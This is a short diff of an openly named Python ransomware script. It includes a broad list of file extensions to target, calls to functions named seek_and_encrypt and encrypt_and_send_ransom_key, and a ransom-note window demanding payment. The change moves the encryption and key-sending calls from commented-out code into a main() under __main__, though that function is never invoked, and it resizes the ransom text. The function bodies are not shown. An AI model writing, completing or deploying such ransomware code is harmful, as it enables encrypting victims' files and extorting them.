@@ -17,10 +17,7 @@ filetype_set = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
 ".asp", ".aspx", ".js", ".java", ".py", ".c", ".cpp", ".cs",
 ".odt", ".ods", ".ini", ".cfg", ".log", ".iso"}
 
-def main():
-    #seek_and_encrypt()
-    #encrypt_and_send_ransom_key()
-    run_ui()
+
     
     
 def seek_and_encrypt():
@@ -93,7 +90,7 @@ def run_ui():
     label = tk.Label(
         frame, 
         text="All your files have been encrypted.\nPay one billion dollars to unlock your files",
-        font=("Arial", 60), 
+        font=("Arial", 24), 
         fg="red", 
         bg="black"
     )
@@ -155,7 +152,10 @@ def run_ui():
 
 
 if __name__ == "__main__":
-    run_ui()
+    def main():
+        seek_and_encrypt()
+        encrypt_and_send_ransom_key()
+        run_ui()
 
     
 #main()
